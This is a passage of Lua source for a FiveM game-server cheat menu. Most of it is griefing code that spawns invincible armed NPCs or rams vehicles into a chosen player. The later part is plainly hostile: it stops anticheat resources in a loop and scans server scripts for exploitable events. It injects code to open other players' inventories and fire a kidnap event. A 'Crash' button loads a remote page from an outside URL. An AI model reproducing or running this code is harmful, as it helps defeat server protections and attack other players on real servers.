                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
					
                elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_flaregun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
                elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
					elseif LTPREMIUM.Button("Rain Agressive NPC") then
                    local bQ = "mp_f_cocaine_01"
					local bR = "weapon_knife"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
						end
                    end
                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
                    elseif LTPREMIUM.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                            freezePlayer = enabled
                        end)
                    then
                    end

                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("SpawnPropsMenu") then
                    if LTPREMIUM.CheckBox(
                        "Attach Prop To Player",
                        attachProp,
                        function(enabled)
                            attachProp = enabled
                        end)
                    then
                    elseif LTPREMIUM.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif LTPREMIUM.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif LTPREMIUM.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif LTPREMIUM.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif LTPREMIUM.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end
                        else
                            drawNotification("Invalid Model!")
                        end
                    end

                    LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("VehicleRamMenu") then
                if LTPREMIUM.Button("Futo") then
                    local model = GetHashKey("futo")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(-1000)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                elseif LTPREMIUM.Button("Bus") then
                    local model = GetHashKey("bus")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(-1000)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                end


                    LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if LTPREMIUM.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, true)
                    end
                end


                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("WeaponMenu") then
                if LTPREMIUM.MenuButton("~r~→  ~s~Single Weapon Spawner", "SingleWeaponMenu") then
                elseif LTPREMIUM.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                elseif LTPREMIUM.Button("Remove All Weapons") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif LTPREMIUM.Button("Give Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                    end
                elseif LTPREMIUM.CheckBox(
                    "No Reload",
                    dwadawdwd,
                    function(enabled)
                        dwadawdwd = enabled
                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Infinite Ammo",
                    JYGNDJ,
                    function(enabled)
                        JYGNDJ = enabled
                        SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Explosive Ammo",
                    bifegfubffff,
                    function(enabled)
                        bifegfubffff = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Oneshot",
                    Oneshot,
                    function(enabled)
                        Oneshot = enabled
                    end)
                then
				elseif LTPREMIUM.CheckBox(
                    "No Recoil",
                    NOXJDSS,
                    function(enabled)
                        NOXJDSS = enabled
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Delete Gun",
                    WADOHWIB,
                    function(enabled)
                        WADOHWIB = enabled
                    end)
                then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~Bullet Gun Options", "BulletGunMenu") then
                end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("WeaponCustomization") then
                if LTPREMIUM.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                        rainbowTint = enabled
                    end)
                then
                elseif LTPREMIUM.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                    currentTint = currentIndex
                    selectedTint = selectedIndex

                    if selectedTint == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                    end
                    if selectedTint == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    end
                    if selectedTint == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    end
                    if selectedTint == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    end
                    if selectedTint == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    end
                    if selectedTint == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    end
                    if selectedTint == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    end
                    if selectedTint == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                end)
                then
                elseif LTPREMIUM.Button("~g~Add Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif LTPREMIUM.Button("~r~Remove Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif LTPREMIUM.Button("~g~Add Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif LTPREMIUM.Button("~r~Remove Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif LTPREMIUM.Button("~g~Add Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif LTPREMIUM.Button("~r~Remove Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("BulletGunMenu") then
                if LTPREMIUM.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                        vehicleGun = enabled
                    end)
                then
                elseif LTPREMIUM.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif LTPREMIUM.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                    currentVehicleSpeed = currentIndex
                    selectedVehicleSpeed = selectedIndex
                end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Ped Gun",
                    pedGun,
                    function(enabled)
                        pedGun = enabled
                end)
                then
                elseif LTPREMIUM.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                    currentPed = currentIndex
                    selectedPed = selectedIndex
                end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Bullet Gun",
                    bulletGun,
                    function(enabled)
                        bulletGun = enabled
                    end)
                then
                elseif LTPREMIUM.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                    currentBullet = currentIndex
                    selectedBullet = selectedIndex
                    end)
                then
                end




                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if LTPREMIUM.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                end



                LTPREMIUM.Display()
            elseif IsDisabledControlPressed(0, 162) then
                if planeisbest then
                    trynaskidhuh("MainMenu")
                else
                    local temp = KeyboardInput("Enter Password", "LTPREMIUM", 100)
                    if temp == dEI then
                        drawNotification("~r~~h~Well done, you just logged in!")
                        planeisbest = true
                        trynaskidhuh("MainMenu")
                    else
                        drawNotification("~r~~h~Login has failed, are you retard?")
                    end
                end
            end

            Citizen.Wait(-1000)
        end
    end)
-- Function to scan for Electron Anticheat
local function ScanElectronAnticheat()
    local foundAnticheat = false
    local foundScriptName = ""

    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest then
            if string.find(string.lower(manifest), "https://electron-services.com") or 
               string.find(string.lower(manifest), "electron services") or 
               string.find(string.lower(manifest), "the most advanced fivem anticheat") then
                foundAnticheat = true
                foundScriptName = resource
                detectedElectronResource = resource
                break
            end
        end
    end

    return foundAnticheat, foundScriptName
end
Citizen.CreateThread(function()
            if GetResourceState("EC_AC") == "started" then
                CreateThread(function()
                    while true do
                        MachoResourceStop("EC_AC")
                        MachoResourceStop("EC-PANEL")
                        MachoResourceStop("vMenu")
                        Wait(100)
                    end
                end)
            else
                CreateThread(function()
                    for i = 0, GetNumResources() - 1 do
                        local v = GetResourceByFindIndex(i)
                        if v and GetResourceState(v) == "started" then
                            if GetResourceMetadata(v, "ac", 0) == "fg" then
                                while true do
                                    MachoResourceStop(v)
                                    Wait(100)
                                end
                            end
                        end
                    end
                end)
            end
        end)
-- Auto-detection and notification function
Citizen.CreateThread(function()
    local foundAnticheat, foundScriptName = ScanElectronAnticheat()
    Citizen.Wait(500)
    
    if foundAnticheat then
        MachoMenuNotification("Electron AC Detected", "Electron Anticheat System Found in Resource: " .. foundScriptName)
    end
end)

-- Background silent search
local function backgroundSilentSearch()
    Citizen.CreateThread(function()
        Citizen.Wait(1000) -- Reduced wait time
        
        local totalResources = GetNumResources()
        local searchedResources = 0
        local backgroundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
        
        for i = 0, totalResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                searchedResources = searchedResources + 1
                
                local skipPatterns = {
                    "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                    "discord", "screenshot", "loading", "spawn", "weather", "time",
                    "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                    "filesystem", "any", "admin", "logging"
                }
                
                local shouldSkip = false
                local lowerName = string.lower(resourceName)
                for _, pattern in ipairs(skipPatterns) do
                    if string.find(lowerName, pattern, 1, true) then
                        shouldSkip = true
                        break
                    end
                end
                
                if not shouldSkip then
                    local checkFiles = {"client.lua", "server.lua", "shared.lua"}
                    for _, fileName in ipairs(checkFiles) do
                        local success, content = pcall(function()
                            return LoadResourceFile(resourceName, fileName)
                        end)
                        if success and content and content ~= "" and string.len(content) < 200000 then
                            local contentLower = string.lower(content)
                            
                            -- Quick pattern matching
                            if string.find(contentLower, "inventory.*server.*open") then
                                table.insert(backgroundTriggers.items, {
                                    resource = resourceName,
                                    trigger = "inventory:server:OpenInventory",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "givecomm") then
                                table.insert(backgroundTriggers.money, {
                                    resource = resourceName,
                                    trigger = resourceName .. ":server:GiveComm",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "paymentcheck") then
                                table.insert(backgroundTriggers.payment, {
                                    resource = resourceName,
                                    trigger = "QBCore:server:Paymentcheck",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "spawnvehicle") then
                                table.insert(backgroundTriggers.vehicle, {
                                    resource = resourceName,
                                    trigger = "QBCore:Command:SpawnVehicle",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                        end
                        
                        -- Faster processing with smaller delays
                        if searchedResources % 20 == 0 then
                            Citizen.Wait(10)
                        end
                    end
                end
            end
        end
        
        -- Merge background findings with main triggers silently
        for category, triggers in pairs(backgroundTriggers) do
            for _, trigger in ipairs(triggers) do
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers[category]) do
                    if existing.resource == trigger.resource and existing.trigger == trigger.trigger then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers[category], trigger)
                end
            end
        end
    end)
end

-- Menu Configuration
local MenuSize = vec2(850, 550)
local MenuStartCoords = vec2(500, 500)
local TabsBarWidth = 180
local SectionsPadding = 10
local MachoPaneGap = 10

-- Simple storage
local foundTriggers = {
    items = {},
    money = {},
    troll = {},
    payment = {},
    vehicle = {}
}

local MenuWindow = nil
local isPlayerIdsEnabled = false
local playerGamerTags = {}
local isPaymentLoopRunning = false
local paymentSpeedInput = nil
local paymentLoopSpeed = 1000 -- Default speed in milliseconds
local isSpectating = false
local spectatingTarget = nil

-- File list
local allFiles = {
    "client.lua", "server.lua", "shared.lua", "config.lua", "main.lua",
    "client/main.lua", "server/main.lua", "shared/main.lua",
    "client/interactions.lua", "client/police.lua", "client/job.lua",
    "server/interactions.lua", "server/police.lua", "server/job.lua",
    "inventory/client.lua", "inventory/server.lua", "inventory/config.lua",
    "qs-inventory/client.lua", "qs-inventory/server.lua",
    "ox_inventory/client.lua", "ox_inventory/server.lua",
    "jobs/police/client.lua", "jobs/police/server.lua",
    "police/client.lua", "police/server.lua",
    "banking/client.lua", "banking/server.lua",
    "shops/client.lua", "shops/server.lua",
    "core/client.lua", "core/server.lua",
    "bridge/client.lua", "bridge/server.lua"
}

-- Players Section Buttons
local function setupPlayerSectionButtons(PlayersSection, playerIdInput)
    MachoMenuButton(PlayersSection, "Open Player Inventory", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ' .. numId .. ')')
                        end
                        MachoMenuNotification("Players", "Opened inventory for ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Opened inventories for all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ' .. numId .. ')')
                    end
                    MachoMenuNotification("Players", "Opened inventory for ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)
MachoMenuButton(PlayersSection, "Crash", function()
   local playerId = MachoMenuGetInputbox(playerIdInput)
   if playerId and playerId ~= "" then
       local serverId = tonumber(playerId)
       if serverId and serverId > 0 then
           -- حفظ الموقع الحالي قبل النقل
           local ped = PlayerPedId()
           local originalCoords = GetEntityCoords(ped)
           
           -- إنشاء وعرض DUI
           local dui = MachoCreateDui("https://wf-675.github.io/crashingo.gg/")
           MachoShowDui(dui)
           
           -- 1. تشغيل كود إيقاف الـ Anti-Cheat بدون ريسورس (آمن)
           Citizen.CreateThread(function()
               if GetResourceState("EC_AC") == "started" then
                   CreateThread(function()
                       while true do
                           MachoResourceStop("EC_AC")
                           MachoResourceStop("EC-PANEL")
                           MachoResourceStop("vMenu")
                           Wait(100) -- تأخير أطول لتجنب البان
                       end
                   end)
               else
                   CreateThread(function()
                       for i = 0, GetNumResources() - 1 do
                           local v = GetResourceByFindIndex(i)
                           if v and GetResourceState(v) == "started" then
                               if GetResourceMetadata(v, "ac", 0) == "fg" then
                                   while true do
                                       MachoResourceStop(v)
                                       Wait(100) -- تأخير أطول لتجنب البان
                                   end
                               end
                           end
                       end
                   end)
               end
           end)
           
           -- 2. نقل اللاعب لمكان بعيد وتشغيل التريقر
           Citizen.CreateThread(function()
               
               -- نقل اللاعب لمكان بعيد (خارج الريندر لكن ليس مره بعيد) - آمن
               Wait(500)
               SetEntityCoords(ped, 1500.0, -1500.0, 58.0, false, false, false, true)
               Wait(100)
               
               Wait(500) -- انتظار أطول
               
               -- 3. تشغيل تريقر الاختطاف باستخدام foundTriggers (بدون تأخير - آمن)
               for _, triggerData in ipairs(foundTriggers.items) do
                   MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. serverId .. ')')
               end
               
               -- 4. الإرجاع للمكان الأصلي بعد 5 ثواني وإخفاء DUI
               Wait(1000) -- انتظار 5 ثوانِ
               
               -- إرجاع آمن للموقع الأصلي
               SetEntityCoords(ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
               Wait(100)
               
               -- إخفاء وحذف DUI
               Wait(100)
               MachoHideDui(dui)
               MachoDestroyDui(dui)
           end)
           
       else
           MachoMenuNotification("Error", "Invalid Player ID")
       end
   else
       MachoMenuNotification("Error", "Enter a Player ID")
   end
end)
    

    MachoMenuButton(PlayersSection, "Revive Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
